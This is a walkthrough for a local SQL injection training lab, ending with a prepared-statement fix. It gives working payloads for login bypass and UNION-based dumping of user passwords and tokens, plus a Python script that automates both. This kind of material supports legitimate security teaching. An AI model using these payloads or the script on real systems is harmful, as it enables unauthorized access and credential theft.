# Lab 01 Walkthrough: SQL Injection (SQLi)

Complete step-by-step offensive guide, payloads, curl commands, and Python automated exploit script for Lab 01.

---

## 🎯 Challenge 1: Authentication Bypass

### 1. The Vulnerable Code Analysis
Look at line 31 of `index.php`:
```php
$query = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
$stmt = $db->query($query);
```
The developer directly placed the `$user` and `$pass` variables inside single quotes without sanitization or parameterized queries.

### 2. Crafting the Payload
If we submit:
- Username: `admin' --`
- Password: *(leave blank or any value)*

The resulting SQL query processed by SQLite becomes:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```
The `--` instructs SQLite to treat everything after it as a comment! The password check is ignored completely, and the database evaluates:
```sql
SELECT * FROM users WHERE username = 'admin'
```
The server authenticates us as `admin` and outputs:
```text
FLAG{SQLI_AUTH_BYPASS_PWNED}
```

### 3. Alternative Universal Bypass Payload
If you don't even know the admin username:
- Username: `' OR 1=1--`
The query becomes:
```sql
SELECT * FROM users WHERE username = '' OR 1=1-- ...
```
This returns the first record in the database, which is almost always the administrator account!

---

## 🎯 Challenge 2: UNION-Based Product Search

### 1. Determining Column Count
In the search box, the underlying query is:
```sql
SELECT id, name, category, price, description FROM products WHERE name LIKE '%<INPUT>%'
```
Notice there are **5 columns** returned.

To prove this via SQL injection without looking at the source code, use `ORDER BY`:
```text
test%' ORDER BY 1-- -   -> (Succeeds)
test%' ORDER BY 5-- -   -> (Succeeds)
test%' ORDER BY 6-- -   -> (SQL Error: out of range)
```
This confirms the query selects exactly **5 columns**.

### 2. Testing Data Types
Send a UNION query matching 5 columns:
```text
' UNION SELECT 1, 'text2', 'text3', 4.0, 'text5'-- -
```
You will see a new row in the product table containing `text2`, `text3`, `text5`.

### 3. Exfiltrating Data from the `users` Table
SQLite stores schema metadata in `sqlite_master`.
To find available tables:
```text
' UNION SELECT 1, sql, tbl_name, 0, type FROM sqlite_master-- -
```
This reveals the `users` table with columns: `id`, `username`, `password`, `role`, `secret_token`.

Now exfiltrate all credentials and flags:
```text
' UNION SELECT id, username, password, role, secret_token FROM users-- -
```
Look at the rendered table: you now have every user's password and secret tokens!

---

## 🤖 Automated Exploitation Script in Python

Save this as `exploit.py` and run it against the target:

```python
import requests
from bs4 import BeautifulSoup

TARGET_URL = "http://127.0.0.1:8888/Lab_01_SQL_Injection/"

def exploit_auth_bypass():
    print("[*] Testing SQLi Auth Bypass...")
    data = {
        'action': 'login',
        'username': "admin' --",
        'password': 'any_password'
    }
    r = requests.post(TARGET_URL + "index.php", data=data)
    if "FLAG{" in r.text:
        soup = BeautifulSoup(r.text, 'html.parser')
        flag = soup.find('code').text
        print(f"[+] Auth Bypass Success! Extracted Flag: {flag}")
    else:
        print("[-] Exploit failed.")

def exploit_union_dump():
    print("\n[*] Testing UNION SQLi Data Dump...")
    payload = "' UNION SELECT id, username, password, role, secret_token FROM users-- -"
    params = {'search': payload}
    r = requests.get(TARGET_URL + "index.php", params=params)
    
    soup = BeautifulSoup(r.text, 'html.parser')
    rows = soup.find_all('tr')
    print("[+] Dumped Database Records:")
    for row in rows:
        cols = [c.text.strip() for c in row.find_all(['td', 'th'])]
        print(" | ".join(cols))

if __name__ == "__main__":
    exploit_auth_bypass()
    exploit_union_dump()
```

---

## 🛡️ Remediation (How to Fix It)

Never concatenate user inputs into SQL strings. Use **Prepared Statements / Parameterized Queries**:

```php
// SECURE CODE:
$stmt = $db->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute([
    ':username' => $user,
    ':password' => $pass
]);
$row = $stmt->fetch(PDO::FETCH_ASSOC);
```
With prepared statements, user input is treated strictly as literal data, making SQL injection mathematically impossible.
